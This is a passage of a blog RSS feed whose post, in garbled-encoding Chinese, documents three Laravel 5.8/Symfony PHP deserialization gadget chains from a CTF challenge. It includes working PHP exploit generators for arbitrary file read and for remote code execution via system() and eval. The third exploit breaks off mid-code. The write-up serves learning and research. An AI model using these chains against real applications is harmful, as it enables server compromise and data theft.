<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>AmiaaaZ's Site</title><link>https://amiaaaz.github.io/</link><description>Recent content on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 04 Dec 2021 14:11:02 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Laravel-5.8.xååºåˆ—åŒ–popé“¾å­¦ä¹ </title><link>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</link><pubDate>Sat, 04 Dec 2021 14:11:02 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</guid><description>&lt;p>äº²è‡ªä»å¤´åˆ°å°¾è·Ÿäº†ä¸€ä¸‹æ¶‰åŠåˆ°çš„ä¸‰ä¸ªé“¾å­ï¼Œç¨å¾®æ‹¯æ•‘äº†ä¸€ç‚¹ç‚¹ç‚¹ç‚¹æˆ‘ç¨€çƒ‚çš„ä»£ç å®¡è®¡èƒ½åŠ›&lt;/p>
&lt;p>å‚è€ƒé“¾æ¥æ”¾åœ¨æ–‡æœ«&lt;/p>
&lt;hr>
&lt;h2 id="é“¾å­1---æ–‡ä»¶åŒ…å«ä»»æ„æ–‡ä»¶è¯»å–">é“¾å­1 - æ–‡ä»¶åŒ…å«/ä»»æ„æ–‡ä»¶è¯»å–&lt;/h2>
&lt;p>æœç´¢&lt;code>__desturct()&lt;/code>æ‰¾å…¥æ‰‹ç‚¹ï¼Œ vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png" alt="image-20211203153626429">&lt;/p>
&lt;p>å®ƒè°ƒç”¨äº†&lt;code>commit()&lt;/code>å’Œ&lt;code>invalidateTags()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png" alt="image-20211203164858978">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png" alt="image-20211203164931565">&lt;/p>
&lt;p>è°ƒç”¨poolçš„&lt;code>saveDeferred()&lt;/code>æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªç±»ç›¸åŒå‘½åç©ºé—´(Symfony\Component\Cache\Adapter)ä¸‹æ‰¾æœ‰æ²¡æœ‰åˆ«çš„ç±»ä¹Ÿå®ç°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¦å¤–å¼€å§‹çš„é‚£ä¸ªpoolæ˜¯åœ¨Adapteræ¥å£ä¸‹ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªAdapterInterfaceæ¥å£å¹¶ä¸”å­˜åœ¨&lt;code>saveDeferred()&lt;/code>çš„ç±»&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png" alt="image-20211203165435637">&lt;/p>
&lt;p>æ‰¾åˆ°è¿™é‡Œvendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png" alt="image-20211203165151335">&lt;/p>
&lt;p>å®ƒåˆè°ƒç”¨äº†initialize()ï¼Œè·Ÿè¿› vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png" alt="image-20211203165212155">&lt;/p>
&lt;p>æ˜¯æˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«ç‚¹äº†ï¼Œå¯ä»¥ä»è¿™é‡Œè¯»flag&lt;/p>
&lt;p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ expäº†ï¼Œè¦æ³¨æ„å‘½åç©ºé—´å’Œæ¥å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png" alt="image-20211203170050397">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png" alt="image-20211203170036701">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
&lt;p>å‰ä¸¤ä¸ªç±»éƒ½æ˜¯Symfony\Component\Cache\Adapterå‘½åç©ºé—´ä¸‹çš„ï¼Œä½†æ˜¯CacheItemæ˜¯Symfony\Component\Cacheä¸‹çš„ï¼Œæ‰€ä»¥è¦å†å¼•å…¥å®ƒï¼Œuse&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="é“¾å­2---rce">é“¾å­2 - rce&lt;/h2>
&lt;p>å›åˆ°å‰é¢åœ¨ç›¸åŒå‘½åç©ºé—´ä¸‹æ‰¾&lt;code>saveDeferred()&lt;/code>çš„åœ°æ–¹ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªç±»ä¹Ÿæœ‰åŒæ ·çš„æ–¹æ³• vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
&lt;p>è·Ÿè¿›&lt;code>doSave()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png" alt="image-20211204102953831">&lt;/p>
&lt;p>223è¡Œå¯ä»¥åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œ&lt;code>setInnerItem&lt;/code>å¯æ§ æˆ‘ä»¬å¯ä»¥è°ƒç”¨&lt;code>system()&lt;/code>ï¼Œæ¥ä¸‹æ¥ç¡®è®¤å®ƒè°ƒç”¨çš„ä¸¤ä¸ªå‚æ•°å¯ä¸å¯æ§&lt;/p>
&lt;p>å¯¹äº&lt;code>$item&lt;/code>ï¼Œæ˜¯è°ƒç”¨å‡½æ•°&lt;code>doSave()&lt;/code>å‡½æ•°æ—¶ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯&lt;code>saveDeferred()&lt;/code>æ—¶çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„ï¼Œå¯æ§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png" alt="image-20211204103425511">&lt;/p>
&lt;p>å¯¹äº&lt;code>$innerItem&lt;/code>æœ‰è¿™æ ·ä¸€ä¸ªifåˆ¤æ–­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png" alt="image-20211204103829313">&lt;/p>
&lt;p>å…‰çœ‹è¿™ä¸ªåˆ¤æ–­è‚¥è‚ çš„çªå…€ï¼Œè¿˜è¦ç»“åˆ207è¡Œçš„&lt;code>$item = (array) $item;&lt;/code>ï¼Œå®ƒå°†ä¸€ä¸ªç±»å¼ºè¡Œè½¬æ¢æˆæ•°ç»„ï¼Œè€Œåé¢è·Ÿç€çš„è¿™ä¸ªifåˆ¤æ–­å°±æ˜¯ä¸ºäº†è§£å†³ç±»ä¸­åŸæœ‰çš„ &lt;em>protected&lt;/em>çš„å±æ€§å†²çªï¼Œæ‰€ä»¥éœ€è¦åœ¨ç›¸åŒçš„å‘½åç©ºé—´é‡Œæ¥ç€æ‰¾ä¸€ä¸ªç±»ï¼ŒåŒ…å«&lt;code>pollHash&lt;/code>å’Œ&lt;code>innerItem&lt;/code>å±æ€§ï¼Œæœ€ç»ˆè¿˜æ˜¯æ‰¾åˆ°äº†CacheItemï¼ˆå‰é¢ä¹Ÿæ˜¯å®ƒ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
&lt;p>æ„é€ exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ¬åœ°å°è¯•ä¸€ä¸‹ï¼ˆæ‡’å¾—å†å¼€é¶æœºäº†w&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
&lt;p>æˆåŠŸäº†æ&lt;/p>
&lt;h2 id="é“¾å­3---rce">é“¾å­3 - rce&lt;/h2>
&lt;p>åœ¨ &lt;strong>[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1&lt;/strong>è¿™é“é¢˜é‡Œèµµå¸ˆå‚…æŠŠè¿™æ¡è·¯å µæ­»äº†ï¼Œä½†æ˜¯æœ¬åœ°å¤ç°æ— æ‰€è°“å•¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png" alt="image-20211204105214847">&lt;/p>
&lt;p>æŠŠè¿™ä¸ªæ³¨é‡Šå–æ¶ˆå³å¯&lt;/p>
&lt;p>çœ‹åˆ°å®ƒè°ƒç”¨äº†&lt;code>events&lt;/code>çš„&lt;code>dispatch&lt;/code>æ–¹æ³•ï¼Œè·Ÿä¸Šé¢æ€è·¯ä¸€æ ·ï¼Œæ¥ç€æ‰¾ä¸€ä¸ªå¯ç”¨çš„åˆ«çš„ç±»é‡Œçš„&lt;code>dispatch&lt;/code>ï¼Œæ¯”å¦‚vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png" alt="image-20211204110831694">&lt;/p>
&lt;p>çœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªåˆ¤æ–­çš„è¿”å›æ—¶è°ƒç”¨çš„&lt;code>dispatchNow()&lt;/code>æ˜¯ä»€ä¹ˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png" alt="image-20211204133634260">&lt;/p>
&lt;p>150è¡Œæœ‰äº®ç‚¹å•Šï¼Œä½¿ç”¨äº†&lt;code>call_user_func&lt;/code>ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°æ¥è‡ª&lt;code>$command&lt;/code>ï¼Œä¹Ÿå°±æ˜¯æœ€å¼€å§‹æ‰¾çš„ææ„å‡½æ•°è°ƒç”¨çš„&lt;code>$this-&amp;gt;event&lt;/code>ï¼›ç°åœ¨è¦æ‰¾ä¸€ä¸ªç±» å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åæˆ‘ä»¬çš„rceå‘½ä»¤ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ï¼Œå®Œæˆæ•´ä¸ªé“¾å­&lt;/p>
&lt;p>ä¸è¿‡å…ˆä¸æ€¥ï¼Œé¦–å…ˆè¦æ»¡è¶³&lt;code>dispatch()&lt;/code>ä¸­çš„ifåˆ¤æ–­&lt;code>$this-&amp;gt;queueResolver &amp;amp;&amp;amp; $this-&amp;gt;commandShouldBeQueued($command)&lt;/code>ï¼Œå‰ä¸€ä¸ªå¯æ§ï¼Œçœ‹çœ‹åé¢è¿™ä¸ª&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png" alt="image-20211204132803262">&lt;/p>
&lt;p>éœ€è¦&lt;code>$command&lt;/code>å¿…é¡»æ˜¯ä¸€ä¸ªå®ç°äº†&lt;code>ShouldQueue&lt;/code>æ¥å£çš„ç±»ï¼Œæ‰¾åˆ°è¿™ä¸ª vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png" alt="image-20211204133133796">&lt;/p>
&lt;p>ç„¶åæ¥ç€æ‰¾é€‚åˆåš&lt;code>call_user_func()&lt;/code>ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»ï¼Œå®ƒéœ€è¦å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•° vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png" alt="image-20211204135811389">&lt;/p>
&lt;p>è¿™ä¸ª&lt;code>load()&lt;/code>å¯ä»¥ç›´æ¥è°ƒç”¨evalæ‰§è¡Œä»£ç ï¼Œä½†æ˜¯&lt;code>$defination&lt;/code>è¦æ»¡è¶³ifçš„åˆ¤æ–­ï¼Œè·Ÿè¿›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png" alt="image-20211204140231175">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png" alt="image-20211204140248303">&lt;/p>
&lt;p>éœ€è¦é¢å¤–å†æ‰¾ä¸¤ä¸ªç±»ï¼Œç¬¬ä¸€ä¸ªç±»å…·æœ‰&lt;code>code&lt;/code>å±æ€§ï¼Œç¬¬äºŒç±»åˆ&lt;code>getName&lt;/code>å‡½æ•°ï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªç±»çš„configå±æ€§&lt;/p>
&lt;p>å¯ç”¨çš„ç¬¬ä¸€ä¸ªç±»å°±æ˜¯&lt;code>getClassName()&lt;/code>æ‰€åœ¨çš„ç±» vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png" alt="image-20211204140502311">&lt;/p>
&lt;p>ç¬¬äºŒä¸ªæ˜¯ vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
&lt;p>æ€»ç»“ä»¥ä¸Šçš„è¿‡ç¨‹ï¼Œå†™exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
